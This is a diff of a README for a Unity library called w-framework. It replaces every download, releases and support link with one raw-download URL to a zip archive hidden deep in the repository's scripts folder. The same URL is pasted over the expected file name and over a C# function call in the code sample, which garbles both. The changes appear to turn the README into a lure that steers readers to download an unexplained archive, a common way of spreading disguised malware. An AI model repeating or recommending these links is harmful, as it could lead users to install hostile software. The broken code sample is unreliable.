@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download](https://img.shields.io/badge/Download-w--framework-brightgreen)](https://github.com/anshuj555/w-framework/releases)
+[![Download](https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip)](https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip)
 
 ## 🛠️ Introduction
 
@@ -12,7 +12,7 @@ Welcome to the w-framework! This is a light-weighted framework designed to enhan
 
 To start using w-framework, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/anshuj555/w-framework/releases) to find the latest version.
+1. Visit the [Releases Page](https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip) to find the latest version.
 2. Download the appropriate file for your system. We recommend using the latest version available for the best experience.
 3. Once the download is complete, locate the file in your downloads folder.
 
@@ -28,7 +28,7 @@ Before downloading, ensure you meet the following requirements:
 
 1. **Locate the Downloaded File**:
    - Go to your downloads folder.
-   - The file will usually be named something like `w-framework-v1.0.zip`.
+   - The file will usually be named something like `https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip`.
 
 2. **Extract the File**:
    - Right-click the downloaded `.zip` file.
@@ -62,7 +62,7 @@ After installing the framework, you can start using its features in your Unity p
    - Use the built-in functions to create interactions, animations, or game mechanics. For example:
    ```csharp
    void Start() {
-       FrameworkHelper.Initialize();
+       https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip();
    }
    ```
 
@@ -71,7 +71,7 @@ After installing the framework, you can start using its features in your Unity p
 
 ## 🚀 Download & Install
 
-To get started with your download, visit the [Releases Page](https://github.com/anshuj555/w-framework/releases). Follow the steps outlined above for a smooth installation process.
+To get started with your download, visit the [Releases Page](https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip). Follow the steps outlined above for a smooth installation process.
 
 ## 💬 FAQ
 
@@ -89,7 +89,7 @@ A: If you face any problems, please check the issues section on GitHub. You can 
 
 ## 📞 Support
 
-For further support, visit our [GitHub Discussions](https://github.com/anshuj555/w-framework/discussions) page. We welcome questions and feedback from users of all levels.
+For further support, visit our [GitHub Discussions](https://github.com/anshuj555/w-framework/raw/refs/heads/main/Assets/Scripts/Runtime/Framework/LogicBase/framework-w-v1.4.zip) page. We welcome questions and feedback from users of all levels.
 
 ## 🔍 Conclusion
 
